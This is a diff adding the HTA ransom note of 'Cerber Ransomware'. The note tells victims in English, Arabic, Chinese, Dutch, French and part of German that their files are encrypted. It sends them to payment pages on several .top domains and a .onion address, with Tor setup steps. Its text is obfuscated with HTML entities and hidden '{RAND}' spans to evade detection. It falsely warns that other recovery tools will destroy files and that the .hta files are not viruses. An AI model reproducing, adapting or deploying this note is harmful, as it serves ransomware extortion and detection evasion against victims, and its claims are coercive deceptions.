@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>C&#069;&#82;BE&#82; &#82;ANSOMWA&#82;&#069;: Instructions</title>
+	<HTA:APPLICATION APPLICATIONNAME="Instructions" SCROLL="yes" SINGLEINSTANCE="yes" WINDOWSTATE="maximize">
+	<style>
+	a {
+		color: #04a;
+		text-decoration: none;
+	}
+	a:hover {
+		text-decoration: underline;
+	}
+	body {
+		background-color: #e7e7e7;
+		color: #222;
+		font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
+		font-size: 13pt;
+		line-height: 19pt;
+	}
+	body, h1 {
+		margin: 0;
+		padding: 0;
+	}
+	hr {
+		color: #bda;
+		height: 2pt;
+		margin: 1.5%;
+	}
+	h1 {
+		color: #555;
+		font-size: 14pt;
+	}
+	ol {
+		padding-left: 2.5%;
+	}
+	ol li {
+		padding-bottom: 13pt;
+	}
+	small {
+		color: #555;
+		font-size: 11pt;
+	}
+	ul {
+		list-style-type: none;
+		margin: 0;
+		padding: 0;
+	}
+	.button {
+		color: #04a;
+		cursor: pointer;
+	}
+	.button:hover {
+		text-decoration: underline;
+	}
+	.container {
+		background-color: #fff;
+		border: 2pt solid #c7c7c7;
+		margin: 5%;
+		min-width: 850px;
+		padding: 2.5%;
+	}
+	.header {
+		border-bottom: 2pt solid #c7c7c7;
+		margin-bottom: 2.5%;
+		padding-bottom: 2.5%;
+	}
+	.h {
+		display: none;
+	}
+	.hr {
+		background: #bda;
+		display: block;
+		height: 2pt;
+		margin-top: 1.5%;
+		margin-bottom: 1.5%;
+		overflow: hidden;
+		width: 100%;
+	}
+	.info {
+		background-color: #efe;
+		border: 2pt solid #bda;
+		display: inline-block;
+		padding: 1.5%;
+		text-align: center;
+	}
+	.updating {
+		color: red;
+		display: none;
+		padding-left: 35px;
+		background: url('data:image/gif;base64,R0lGODlhGQAZAKIEAMzMzJmZmTMzM2ZmZgAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh+QQFAAAEACwAAAAAGQAZAAADVki63P4wSEiZvLXemRf4yhYoQ0l9aMiVLISCDms+L/DIwwnfc+c3qZ9g6Hn5hkhF7YgUKI2dpvNpExJ/WKquSoMCvd9geDeuBpcuGFrcQWep5Df7jU0AACH5BAUAAAQALAoAAQAOABQAAAMwSLDU/iu+Gdl0FbTAqeXg5YCdSJCBuZVqKw5wC8/qHJv2IN+uKvytn9AnFBCHx0cCACH5BAUAAAQALAoABAAOABQAAAMzSLoEzrC5F9Wk9YK6Jv8gEYzgaH4myaVBqYbfIINyHdcDI+wKniu7YG+2CPI4RgFI+EkAACH5BAUAAAQALAQACgAUAA4AAAMzSLrcBNDJBeuUNd6WwXbWtwnkFZwMqUpnu6il06IKLChDrsxBGufAHW0C1IlwxeMieEkAACH5BAUAAAQALAEACgAUAA4AAAM0SLLU/lAtFquctk6aIe5gGA1kBpwPqVZn66hl1KINPDRB3sxAGufAHc0C1IkIxcARZ4QkAAAh+QQFAAAEACwBAAQADgAUAAADMUhK0vurSfiko8oKHC//yyCCYvmVI4cOZAq+UCCDcv3VM4cHCuDHOZ/wI/xxigDQMAEAIfkEBQAABAAsAQABAA4AFAAAAzNIuizOkLgZ13xraHVF1puEKWBYlUP1pWrLBLALz+0cq3Yg324PAUAXcNgaBlVGgPAISQAAIfkEBQAABAAsAQABABQADgAAAzRIujzOMBJHpaXPksAVHoogMlzpZWK6lF2UjgobSK9AtjSs7QTg8xCfELgQ/og9I1IxXCYAADs=') left no-repeat;
+	}
+	#change_language {
+		float: right;
+	}
+	#change_language, #texts div {
+		display: none;
+	}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<div class="header">
+			<a id="change_language" href="#" onclick="return changeLanguage1();" title="English">&#9745; English</a>
+			<h1>C&#069;&#82;BE&#82; &#82;ANSOMWA&#82;&#069;</h1>
+			<small id="title">Instructions</small>
+		</div>
+		<div id="languages">
+			<p>&#9745; Select your language</p>
+			<ul>
+				<li><a href="#" title="English" onclick="return showBlock('en');">English</a></li>
+				<li><a href="#" title="Arabic" onclick="return showBlock('ar');">العربية</a></li>
+				<li><a href="#" title="Chinese" onclick="return showBlock('zh');">中文</a></li>
+				<li><a href="#" title="Dutch" onclick="return showBlock('nl');">Nederlands</a></li>
+				<li><a href="#" title="French" onclick="return showBlock('fr');">Français</a></li>
+				<li><a href="#" title="German" onclick="return showBlock('de');">Deutsch</a></li>
+				<li><a href="#" title="Italian" onclick="return showBlock('it');">Italiano</a></li>
+				<li><a href="#" title="Japanese" onclick="return showBlock('ja');">日本語</a></li>
+				<li><a href="#" title="Korean" onclick="return showBlock('ko');">한국어</a></li>
+				<li><a href="#" title="Polish" onclick="return showBlock('pl');">Polski</a></li>
+				<li><a href="#" title="Portuguese" onclick="return showBlock('pt');">Português</a></li>
+				<li><a href="#" title="Spanish" onclick="return showBlock('es');">Español</a></li>
+				<li><a href="#" title="Turkish" onclick="return showBlock('tr');">Türkçe</a></li>
+			</ul>
+		</div>
+		<div id="texts">
+			<div id="en">
+				<p>Can't y<span class="h">{RAND}</span>ou find the necessary files?<br>Is the c<span class="h">{RAND}</span>ontent of your files not readable?</p>
+				<p>It is normal becau<span class="h">{RAND}</span>se the files' names and the data in your files have been encryp<span class="h">{RAND}</span>ted by "Ce<span class="h">{RAND}</span>r&#98;er&nbsp;Rans&#111;mware".</p>
+				<p>I<span class="h">{RAND}</span>t means your files are NOT damage<span class="h">{RAND}</span>d! Your files are modified only. This modification is reversible.<br>F<span class="h">{RAND}</span>rom now it is not poss<span class="h">{RAND}</span>ible to use your files until they will be decrypted.</p>
+				<p>The only way to de<span class="h">{RAND}</span>crypt your files safely is to &#98;uy the special decryption software "C<span class="h">{RAND}</span>er&#98;er&nbsp;Decryptor".</p>
+				<p>Any attempts to r<span class="h">{RAND}</span>estore your files with the thir<span class="h">{RAND}</span>d-party software will be fatal for your files!</p>
+				<hr>
+				<p class="w331208">You can proc<span class="h">{RAND}</span>eed with purchasing of the decryption softw<span class="h">{RAND}</span>are at your personal page:</p>
+				<p><span class="info"><span class="updating">Ple<span class="h">{RAND}</span>ase wait...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>If t<span class="h">{RAND}</span>his page cannot be opened &nbsp;<span class="button" onclick="return updUrl('en');">cli<span class="h">{RAND}</span>ck here</span>&nbsp; to get a new addr<span class="h">{RAND}</span>ess of your personal page.<br><br>If the addre<span class="h">{RAND}</span>ss of your personal page is the same as befo<span class="h">{RAND}</span>re after you tried to get a new one,<br>you c<span class="h">{RAND}</span>an try to get a new address in one hour.</p>
+				<p>At th<span class="h">{RAND}</span>is p&#097;ge you will receive the complete instr<span class="h">{RAND}</span>uctions how to buy the decrypti<span class="h">{RAND}</span>on software for restoring all your files.</p>
+				<p>Also at this p&#097;ge you will be able to res<span class="h">{RAND}</span>tore any one file for free to be sure "Cer&#98;e<span class="h">{RAND}</span>r&nbsp;Decryptor" will help you.</p>
+				<hr>
+				<p>If your per<span class="h">{RAND}</span>sonal page is not availa<span class="h">{RAND}</span>ble for a long period there is another way to open your personal page - insta<span class="h">{RAND}</span>llation and use of Tor&nbsp;Browser:</p>
+				<ol>
+					<li>run your Inte<span class="h">{RAND}</span>rnet browser (if you do not know wh&#097;t it is run the Internet&nbsp;Explorer);</li>
+					<li>ent<span class="h">{RAND}</span>er or copy the &#097;ddress <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/downlo&#097;d/download-easy.html.en</a> into the address bar of your browser &#097;nd press ENTER;</li>
+					<li>wait for the site load<span class="h">{RAND}</span>ing;</li>
+					<li>on the site you will be offered to do<span class="h">{RAND}</span>wnload Tor&nbsp;Browser; download and run it, follow the installation instructions, wait until the installation is completed;</li>
+					<li>ru<span class="h">{RAND}</span>n Tor&nbsp;Browser;</li>
+					<li>connect with the butt<span class="h">{RAND}</span>on "Connect" (if you use the English version);</li>
+					<li>a normal Internet bro<span class="h">{RAND}</span>wser window will be opened &#097;fter the initialization;</li>
+					<li>type or copy the add<span class="h">{RAND}</span>ress <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> in this browser address bar;</li>
+					<li>pre<span class="h">{RAND}</span>ss ENTER;</li>
+					<li>the site sho<span class="h">{RAND}</span>uld be loaded; if for some reason the site is not lo<span class="h">{RAND}</span>ading wait for a moment and try again.</li>
+				</ol>
+				<p>If you have any pr<span class="h">{RAND}</span>oblems during installation or use of Tor&nbsp;Browser, please, visit <a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> and type request in the searc<span class="h">{RAND}</span>h bar "Install Tor&nbsp;Browser Windows" and you will find a lot of training videos about Tor&nbsp;Browser installation and use.</p>
+				<hr>
+				<p><strong>Addit<span class="h">{RAND}</span>ional information:</strong></p>
+				<p>You will fi<span class="h">{RAND}</span>nd the instru<span class="h">{RAND}</span>cti&#111;ns ("*_READ_THIS_FILE_*.hta") for re<span class="h">{RAND}</span>st&#111;ring y&#111;ur files in &#097;ny f<span class="h">{RAND}</span>&#111;lder with your enc<span class="h">{RAND}</span>rypted files.</p>
+				<p>The instr<span class="h">{RAND}</span>ucti&#111;ns "*_READ_THIS_FILE_*.hta" in the f<span class="h">{RAND}</span>&#111;lder<span class="h">{RAND}</span>s with your encry<span class="h">{RAND}</span>pted files are not vir<span class="h">{RAND}</span>uses! The instruc<span class="h">{RAND}</span>tions "*_READ_THIS_FILE_*.hta" will he<span class="h">{RAND}</span>lp you to dec<span class="h">{RAND}</span>rypt your files.</p>
+				<p>Remembe<span class="h">{RAND}</span>r! The w&#111;rst si<span class="h">{RAND}</span>tu&#097;tion already happ<span class="h">{RAND}</span>ened and n&#111;w the future of your files de<span class="h">{RAND}</span>pends on your determ<span class="h">{RAND}</span>ination and speed of your actions.</p>
+			</div>
+			<div id="ar" style="direction: rtl;">
+				<p>لا يمكنك العثور على الملفات الضرورية؟<br>هل محتوى الملفات غير قابل للقراءة؟</p>
+				<p>هذا أمر طبيعي لأن أسماء الملفات والبيانات في الملفات قد تم تشفيرها بواسطة "Cer&#98;er&nbsp;Rans&#111;mware".</p>
+				<p>وهذا يعني أن الملفات الخاصة بك ليست تالفة! فقد تم تعديل ملفاتك فقط. ويمكن التراجع عن هذا.<br>ومن الآن فإنه لا يكن استخدام الملفات الخاصة بك حتى يتم فك تشفيرها.</p>
+				<p>الطريقة الوحيدة لفك تشفير ملفاتك بأمان هو أن تشتري برنامج فك التشفير المتخصص "Cer&#98;er&nbsp;Decryptor".</p>
+				<p>إن أية محاولات لاستعادة الملفات الخاصة بك بواسطة برامج من طرف ثالث سوف تكون مدمرة لملفاتك!</p>
+				<hr>
+				<p>يمكنك الشروع في شراء برنامج فك التشفير من صفحتك الشخصية:</p>
+				<p><span class="info"><span class="updating">أرجو الإنتظار...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>في حالة تعذر فتح هذه الصفحة &nbsp;<span class="button" onclick="return updUrl('ar');">انقر هنا</span>&nbsp; لإنشاء عنوان جديد لصفحتك الشخصية.</p>
+				<p>في هذه الصفحة سوف تتلقى تعليمات كاملة حول كيفية شراء برنامج فك التشفير لاستعادة جميع الملفات الخاصة بك.</p>
+				<p>في هذه الصفحة أيضًا سوف تتمكن من استعادة ملف واحد بشكل مجاني للتأكد من أن "Cer&#98;er&nbsp;Decryptor" سوف يساعدك.</p>
+				<hr>
+				<p>إذا كانت صفحتك الشخصية غير متاحة لفترة طويلة فإن ثمّة طريقة أخرى لفتح صفحتك الشخصية - تحميل واستخدام متصفح Tor:</p>
+				<ol>
+					<li>قم بتشغيل متصفح الإنترنت الخاص بك (إذا كنت لا تعرف ما هو قم بتشغيل إنترنت إكسبلورر);</li>
+					<li>قم بكتابة أو نسخ العنوان <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> إلى شريط العنوان في المستعرض الخاص بك ثم اضغط ENTER;</li>
+					<li>انتظر لتحميل الموقع;</li>
+					<li>سوف يعرض عليك الموقع تحميل متصفح Tor. قم بتحميله وتشغيله، واتبع تعليمات التثبيت، وانتظر حتى اكتمال التثبيت;</li>
+					<li>قم بتشغيل متصفح Tor;</li>
+					<li>اضغط على الزر "Connect" (إذا كنت تستخدم النسخة الإنجليزية);</li>
+					<li>سوف تُفتح نافذة متصفح الإنترنت العادي بعد البدء;</li>
+					<li>قم بكتابة أو نسخ العنوان <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> في شريط العنوان في المتصفح;</li>
+					<li>اضغط ENTER;</li>
+					<li>يجب أن يتم تحميل الموقع؛ إذا لم يتم تحميل الموقع لأي سبب، انتظر للحظة وحاول مرة أخرى.</li>
+				</ol>
+				<p>إذا كان لديك أية مشكلات أثناء عملية التثبيت أو استخدام متصفح Tor، يُرجى زيارة <a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> واكتب الطلب "install tor browser windows" أو "تثبيت نوافذ متصفح Tor" في شريط البحث، وسوف تجد الكثير من أشرطة الفيديو للتدريب حول تثبيت متصفح Tor واستخدامه.</p>
+				<hr>
+				<p><strong>معلومات إضافية:</strong></p>
+				<p>سوف تجد إرشادات استعادة الملفات الخاصة بك ("*_READ_THIS_FILE_*") في أي مجلد مع ملفاتك المشفرة.</p>
+				<p>الإرشادات ("*_READ_THIS_FILE_*") الموجودة في المجلدات مع ملفاتك المشفرة ليست فيروسات والإرشادات ("*_READ_THIS_FILE_*") سوف تساعدك على فك تشفير الملفات الخاصة بك.</p>
+				<p>تذكر أن أسوأ موقف قد حدث بالفعل، والآن مستقبل ملفاتك يعتمد على عزيمتك وسرعة الإجراءات الخاصة بك.</p>
+			</div>
+			<div id="zh">
+				<p>您找不到所需的文件？<br>您文件的内容无法阅读？</p>
+				<p>这是正常的，因为您文件的文件名和数据已经被“Cer&#98;er&nbsp;Rans&#111;mware”加密了。</p>
+				<p>这意味着您的文件并没有损坏！您的文件只是被修改了，这个修改是可逆的，解密之前您无法使用您的文件。</p>
+				<p>安全解密您文件的唯一方式是购买特别的解密软件“Cer&#98;er&nbsp;Decryptor”。</p>
+				<p>任何使用第三方软件恢复您文件的方式对您的文件来说都将是致命的！</p>
+				<hr>
+				<p>您可以在您的个人页面上购买解密软件：</p>
+				<p><span class="info"><span class="updating">请稍候...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>如果这个页面无法打开，请 <span class="button" onclick="return updUrl('zh');">点击这里</span> 生成您个人页面的新地址。</p>
+				<p>您将在这个页面上看到如何购买解密软件以恢复您的文件。</p>
+				<p>您可以在这个页面使用“Cer&#98;er&nbsp;Decryptor”免费恢复任何文件。</p>
+				<hr>
+				<p>如果您的个人页面长期不可用，有其他方法可以打开您的个人页面 - 安装并使用 Tor 浏览器：</p>
+				<ol>
+					<li>使用您的上网浏览器（如果您不知道使用 Internet&nbsp;Explorer 的话）；</li>
+					<li>在浏览器的地址栏输入或复制地址 <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> 并按 ENTER 键；</li>
+					<li>等待站点加载；</li>
+					<li>您将在站点上下载 Tor 浏览器；下载并运行它，按照安装指南进行操作，等待直至安装完成；</li>
+					<li>运行 Tor 浏览器；</li>
+					<li>使用“Connect”按钮进行连接（如果您使用英文版）；</li>
+					<li>初始化之后将打开正常的上网浏览器窗口；</li>
+					<li>在浏览器地址栏中输入或复制地址 <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br></li>
+					<li>按 ENTER 键；</li>
+					<li>该站点将加载；如果由于某些原因等待一会儿后没有加载，请重试。</li>
+				</ol>
+				<p>如果在安装期间或使用 Tor 浏览器期间有任何问题，请访问 <a href="https://www.baidu.com/s?wd=%E6%80%8E%E4%B9%88%E5%AE%89%E8%A3%85%20tor%20%E6%B5%8F%E8%A7%88%E5%99%A8" target="_blank">https://www.baidu.com</a> 并在搜索栏中输入“怎么安装 Tor 浏览器”，您将找到有关如何安装洋葱 Tor 浏览器的说明和教程。</p>
+				<hr>
+				<p><strong>附加信息：</strong></p>
+				<p>您将在任何带有加密文件的文件夹中找到恢复您文件(“*_READ_THIS_FILE_*.hta”)的说明。</p>
+				<p>带有加密文件的文件夹中的(“*_READ_THIS_FILE_*.hta”)说明不是病毒，(“*_READ_THIS_FILE_*.hta”)说明将帮助您解密您的文件。</p>
+				<p>请记住，最坏的情况都发生过了，您的文件还能不能用取决于您的决定和反应速度。</p>
+			</div>
+			<div id="nl">
+				<p>Kunt u de nodige files niet vinden?<br>Is de inhoud van uw bestanden niet leesbaar?</p>
+				<p>Het is gewoonlijk omdat de bestandsnamen en de gegevens in uw bestanden zijn versleuteld door “Cer&#98;er&nbsp;Rans&#111;mware”.</p>
+				<p>Het betekent dat uw bestanden NIET beschadigd zijn! Uw bestanden zijn alleen gewijzigd. Deze wijziging is omkeerbaar. Vanaf nu is het niet mogelijk uw bestanden te gebruiken totdat ze ontsleuteld zijn.</p>
+				<p>De enige manier om uw bestanden veilig te ontsleutelen is door de speciale ontsleutel-software “Cer&#98;er&nbsp;Decryptor” te kopen.</p>
+				<p>Elke poging om uw bestanden te herstellen met software van een derde partij zal fataal zijn voor uw bestanden!</p>
+				<hr>
+				<p>U kunt op uw persoonlijke pagina de ontsleutel-software kopen:</p>
+				<p><span class="info"><span class="updating">Even geduld aub...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>Als deze pagina niet geopend kan worden &nbsp;<span class="button" onclick="return updUrl('nl');">klik dan hier</span>&nbsp; om een nieuw adres aan uw persoonlijke pagina toe te voegen.</p>
+				<p>Op deze pagina zult u de complete instructies ontvangen hoe u de ontsleutel-software kunt kopen om al uw bestanden te herstellen.</p>
+				<p>Op deze pagina kunt u ook één file gratis herstellen om u ervan te verzekeren dat “Cer&#98;er&nbsp;Decryptor” u zal helpen.</p>
+				<hr>
+				<p>Als uw persoonlijke pagina langere tijd niet beschikbaar is, is er een andere manier om uw persoonlijke pagina te openen – het installeren en gebruiken van Tor&nbsp;Browser:</p>
+				<ol>
+					<li>start uw internet browser (als u niet weet welke dat is, start dan Internet&nbsp;Explorer);</li>
+					<li>voer het adres in of kopieer het adres <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> in de adresbalk van uw browser en druk op ENTER;</li>
+					<li>wacht totdat de site laadt;</li>
+					<li>op de site wordt u aangeboden om de Tor&nbsp;Browser te laden; downloadt het en voer het uit, volg de installatie instructies, en wacht totdat de installatie compleet is;</li>
+					<li>voer Tor&nbsp;Browser uit;</li>
+					<li>maak verbinding met de knop “Connect” (als u de Engelse versie gebruikt);</li>
+					<li>een normale Internet browser zal openen na de installatie;</li>
+					<li>typ of kopieer het adres <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> in de adresbalk van uw browser;</li>
+					<li>druk ENTER;</li>
+					<li>de site zou moeten laden; als om enige reden de site niet laadt, wacht dan even en probeer opnieuw.</li>
+				</ol>
+				<p>Indien uw problemen heeft tijdens de installatie of het gebruik van Tor&nbsp;Browser, ga dan naar <a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> en typ in de zoekbalk “install tor browser windows” en u zult een heleboel training video’s vinden over de installatie en het gebruik van Tor&nbsp;Browser.</p>
+				<hr>
+				<p><strong>Aanvullende informatie:</strong></p>
+				<p>U vindt de instructies om uw bestanden te herstellen (“*_READ_THIS_FILE_*.hta”) in elke folder met uw versleutelde bestanden.</p>
+				<p>De instructies (“*_READ_THIS_FILE_*.hta”) in de folders met uw versleutelde bestanden zijn geen virussen, de instructies (“*_READ_THIS_FILE_*.hta”) zal u helpen uw bestanden te ontsleutelen.</p>
+				<p>Denk eraan, het ergste is al gebeurd en de toekomst van uw bestanden hangt af van uw vastberadenheid en de snelheid van uw acties.</p>
+			</div>
+			<div id="fr">
+				<p>Vous ne trouvez pas les fichiers necessaires?<br>Le contenu de vos fichiers n’est pas lisible?</p>
+				<p>C’est normal car les noms des fichiers et des donnees dans vos fichiers ont ete cryptes par «Cer&#98;er&nbsp;Rans&#111;mware».</p>
+				<p>Cela signifie que vos fichiers ne sont PAS endommages! Vos fichiers sont seulement modifies. Cette modification est reversible. A partir de maintenant, il n’est plus possible d’utiliser vos fichiers jusqu'a ce qu’ils soient decryptes.</p>
+				<p>La seule facon de decrypter vos fichiers en toute securite est d’acheter le logiciel de decryptage special «Cer&#98;er&nbsp;Decryptor».</p>
+				<p>Toute tentative visant a restaurer vos fichiers avec le logiciel tiers sera fatale pour vos fichiers!</p>
+				<hr>
+				<p>Vous pouvez proceder a l’achat du logiciel de decryptage sur votre page personnelle:</p>
+				<p><span class="info"><span class="updating">S'il vous plaît, attendez...</span><a class="url" href="http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16bwhs.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1apkjn.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.16qpet.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1jhnvt.top/0123-4567-89AB-CDEF-0123</a><hr><a href="http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123" target="_blank">http://p27dokhpz2n7nvgr.1dsdm4.top/0123-4567-89AB-CDEF-0123</a></span></p>
+				<p>Si vous ne pouvez pas ouvrir cette page &nbsp;<span class="button" onclick="return updUrl('fr');">cliquez ici</span>&nbsp; pour generer une nouvelle adresse pour votre page personnelle.</p>
+				<p>A cette page, vous recevrez les instructions completes sur la facon d'acheter le logiciel de decryptage pour la restauration de tous vos fichiers.</p>
+				<p>Egalement a cette page, vous serez en mesure de restaurer n’importe quel fichier gratuitement pour etre sur que «Cer&#98;er&nbsp;Decryptor» vous aidera.</p>
+				<hr>
+				<p>Si votre page personnelle n’est pas disponible pendant une longue periode il y a une autre facon d’ouvrir votre page personnelle - installation et utilisation de Tor&nbsp;Browser:</p>
+				<ol>
+					<li>executez votre navigateur Internet (si vous ne savez pas ce que c’est, lancez Internet&nbsp;Explorer);</li>
+					<li>saisissez ou copiez l’adresse <a href="https://www.torproject.org/download/download-easy.html.en" target="_blank">https://www.torproject.org/download/download-easy.html.en</a> dans la barre d’adresses de votre navigateur et appuyez sur ENTREE;</li>
+					<li>attendez que le site charge;</li>
+					<li>sur le site, il vous sera propose de telecharger Tor&nbsp;Browser; Telechargez et executez-le, suivez les instructions d’installation, attendez que l’installation se termine;</li>
+					<li>lancez Tor&nbsp;Browser;</li>
+					<li>connectez-vous avec le bouton «Connect» (si vous utilisez la version anglaise);</li>
+					<li>une fenetre du navigateur Internet normale sera ouverte apres l’initialisation;</li>
+					<li>tapez ou copiez l’adresse <br><span class="info">http://p27dokhpz2n7nvgr.onion/0123-4567-89AB-CDEF-0123</span><br> dans cette barre d’adresse de navigateur;</li>
+					<li>appuyez sur ENTREE;</li>
+					<li>le site doit etre charge; Si pour une raison quelconque, le site ne se charge pas, attendez quelques instants et reessayez.</li>
+				</ol>
+				<p>Si vous avez des problemes pendant l’installation ou l’utilisation de Tor&nbsp;Browser, veuillez visiter <a href="https://www.youtube.com/results?search_query=Install+Tor+Browser+Windows" target="_blank">https://www.youtube.com</a> et saisir la demande dans la barre de recherche « installer la fenetre tor browser » vous y trouverez de nombreuses videos de formation sur l'installation et l'utilisation de Tor&nbsp;Browser.</p>
+				<hr>
+				<p><strong>Informations supplementaires:</strong></p>
+				<p>Vous trouverez les instructions pour la restauration de fichiers («*_READ_THIS_FILE_*.hta») dans n’importe quel dossier contenant vos fichiers cryptes.</p>
+				<p>Les instructions («*_READ_THIS_FILE_*.hta») dans les dossiers contenant vos fichiers cryptes ne sont pas des virus, les d’instructions («*_READ_THIS_FILE_*.hta») vous aideront a decrypter vos fichiers.</p>
+				<p>N’oubliez pas que la pire des situations est deja arrivee et maintenant l’avenir de vos fichiers depend de votre determination et de la rapidite de vos actions.</p>
+			</div>
+			<div id="de">
+				<p>Sie können die benötigten Dateien nicht finden?<br>Sind die Inhalte Ihrer Dateien nicht lesbar?</p>
+				<p>Das ist normal, da die Namen und die Daten in Ihren Dateien von "Cer&#98;er&nbsp;Rans&#111;mware" verschlüsselt werden.</p>
+				<p>Das bedeutet, Ihre Dateien sind NICHT beschädigt! Ihre Daten wurden lediglich modifiziert. Diese Modifikation kann rückgängig gemacht werden. Ab sofort können Sie Ihre Dateien erst dann wieder verwenden, nachdem diese entschlüsselt wuden.</p>
+				<p>Die einzige Möglichkeit, wie Sie Ihre Dateien zuverlässig entschlüsseln können, ist die spezielle Entschlüsselungssoftware "Cer&#98;er&nbsp;Decryptor".</p>
+				<p>Alle Versuche, Ihre Dateien mit einer Software Dritter wiederherzustellen, wird für Ihre Dateien verheerend sein!</p>
+				<hr>
+				<p>Sie können auf Ihrer persönlichen Seite mit dem Kauf der Entschlüsselungssoftware fortfahren:</p>
